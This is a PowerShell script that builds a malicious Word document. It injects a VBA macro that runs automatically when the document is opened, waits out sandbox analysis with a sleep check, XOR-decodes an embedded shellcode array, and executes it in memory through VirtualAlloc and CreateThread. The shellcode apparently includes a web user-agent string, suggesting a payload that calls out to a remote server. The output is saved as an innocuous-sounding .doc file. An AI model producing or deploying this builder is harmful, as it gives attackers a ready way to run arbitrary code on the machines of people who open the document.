$wordApp = New-Object -ComObject Word.Application
$wordApp.Visible = $true
$doc = $wordApp.Documents.Add()
$paragraph = $doc.Content.Paragraphs.Add()
$paragraph.Range.Text = "Hello"

$project = $doc.VBProject
$component = $project.VBComponents.Add([Microsoft.Vbe.Interop.vbext_ComponentType]::vbext_ct_StdModule)

$code = @"
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Function
    End If

     buf = Array(225, 245, 146, 29, 29, 29, 125, 148, 248, 44, 207, 121, 150, 79, 45, 150, 79, 17, 150, 79, 9, 18, 170, 87, 59, 150, 111, 53, 44, 226, 44, 221, 177, 33, 124, 97, 31, 49, 61, 220, 210, 16, 28, 218, 84, 104, 242, 79, 74, 150, _ 
79, 13, 150, 95, 33, 28, 205, 150, 93, 101, 152, 221, 105, 81, 28, 205, 150, 69, 61, 150, 85, 5, 77, 28, 206, 152, 212, 105, 33, 84, 150, 41, 150, 44, 226, 28, 203, 44, 221, 177, 220, 210, 16, 28, 218, 37, 253, 104, 233, 30, _ 
96, 229, 38, 96, 57, 104, 253, 69, 150, 69, 57, 28, 206, 123, 150, 17, 86, 150, 69, 1, 28, 206, 150, 25, 150, 28, 205, 148, 89, 57, 57, 70, 70, 124, 68, 71, 76, 226, 253, 69, 66, 71, 150, 15, 244, 157, 226, 226, 226, 64, _ 
117, 115, 120, 105, 29, 117, 106, 116, 115, 116, 73, 117, 81, 106, 59, 26, 226, 200, 44, 198, 78, 78, 78, 78, 78, 245, 98, 29, 29, 29, 80, 114, 103, 116, 113, 113, 124, 50, 40, 51, 45, 61, 53, 116, 77, 124, 121, 38, 61, 94, _ 
77, 72, 61, 82, 78, 61, 44, 43, 66, 40, 61, 113, 116, 118, 120, 61, 80, 124, 126, 61, 82, 78, 61, 69, 52, 61, 92, 109, 109, 113, 120, 74, 120, 127, 86, 116, 105, 50, 43, 45, 40, 51, 44, 51, 44, 40, 61, 53, 86, 85, _ 
73, 80, 81, 49, 61, 113, 116, 118, 120, 61, 90, 120, 126, 118, 114, 52, 61, 75, 120, 111, 110, 116, 114, 115, 50, 44, 43, 51, 40, 61, 80, 114, 127, 116, 113, 120, 50, 44, 40, 88, 44, 41, 37, 61, 78, 124, 123, 124, 111, 116, _ 
50, 43, 45, 41, 51, 44, 29, 117, 39, 75, 100, 186, 226, 200, 78, 78, 119, 30, 78, 78, 117, 166, 28, 29, 29, 245, 49, 28, 29, 29, 50, 110, 124, 90, 74, 74, 109, 122, 104, 106, 107, 75, 71, 106, 113, 119, 89, 77, 88, 91, _ 
92, 124, 92, 121, 112, 120, 110, 42, 69, 115, 126, 43, 92, 90, 42, 119, 69, 120, 76, 90, 117, 103, 109, 44, 105, 106, 37, 100, 79, 100, 48, 72, 124, 109, 116, 46, 112, 74, 81, 88, 73, 66, 75, 84, 40, 66, 72, 37, 114, 111, _ 
122, 126, 110, 113, 87, 109, 126, 76, 110, 104, 41, 117, 114, 90, 87, 122, 80, 108, 41, 118, 87, 77, 45, 112, 113, 101, 74, 120, 113, 76, 72, 106, 43, 115, 41, 104, 124, 87, 46, 91, 112, 80, 122, 92, 124, 82, 47, 79, 106, 84, _ 
105, 87, 87, 68, 46, 126, 89, 45, 76, 75, 85, 66, 41, 103, 71, 123, 44, 120, 115, 81, 118, 124, 120, 47, 88, 43, 75, 41, 82, 115, 46, 78, 123, 116, 44, 105, 29, 77, 117, 74, 148, 130, 219, 226, 200, 148, 219, 78, 117, 29, _ 
47, 245, 153, 78, 78, 78, 74, 78, 75, 117, 246, 72, 51, 38, 226, 200, 139, 119, 23, 66, 117, 157, 46, 29, 29, 148, 253, 119, 25, 77, 119, 2, 75, 117, 104, 91, 131, 155, 226, 200, 78, 78, 78, 78, 75, 117, 48, 27, 5, 102, _ 
226, 200, 152, 221, 104, 9, 117, 149, 14, 29, 29, 117, 89, 237, 40, 253, 226, 200, 82, 104, 208, 245, 86, 29, 29, 29, 119, 93, 117, 29, 13, 29, 29, 117, 29, 29, 93, 29, 78, 117, 69, 185, 78, 248, 226, 200, 142, 78, 78, 148, _ 
250, 74, 117, 29, 61, 29, 29, 78, 75, 117, 15, 139, 148, 255, 226, 200, 152, 221, 105, 210, 150, 26, 28, 222, 152, 221, 104, 248, 69, 222, 66, 245, 118, 226, 226, 226, 44, 36, 47, 51, 44, 43, 37, 51, 41, 40, 51, 44, 36, 46, _ 
29, 166, 253, 0, 55, 23, 117, 187, 136, 160, 128, 226, 200, 33, 27, 97, 23, 157, 230, 253, 104, 24, 166, 90, 14, 111, 114, 119, 29, 78, 226, 200)

    for i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 29
    Next i   

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

End Function

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub

"@

$component.CodeModule.AddFromString($code)

$filepath = "C:\users\ds_wa\desktop\myapplication2.doc"
$doc.SaveAs2($filepath,[Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatDocument97)
$wordApp.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($wordApp) | Out-Null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()